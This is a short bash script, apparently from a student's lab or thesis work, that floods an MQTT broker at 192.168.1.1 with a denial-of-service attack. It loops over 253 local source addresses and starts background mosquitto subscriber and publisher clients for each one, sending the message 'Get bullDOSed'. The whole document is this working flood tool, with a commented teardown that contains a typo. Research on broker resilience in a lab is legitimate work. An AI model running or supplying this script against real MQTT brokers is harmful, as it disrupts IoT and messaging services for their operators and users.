#!/bin/bash
echo "Starting the attack now"
for i in {2..254}
do
  IP_ADDR="192.168.1.$i"
  echo $IP_ADDR
  /home/patty/Desktop/TUM/BA/mosquitto/client/mosquitto_sub -A "$IP_ADDR" -p 1881 -h 192.168.1.1 -t test &
  /home/patty/Desktop/TUM/BA/mosquitto/client/mosquitto_pub -A "$IP_ADDR" -p 1881 -h 192.168.1.1 -t test -m "Get bullDOSed" &
done

# teardown
# killall mosquitto_sub
# killall mosquittp_pub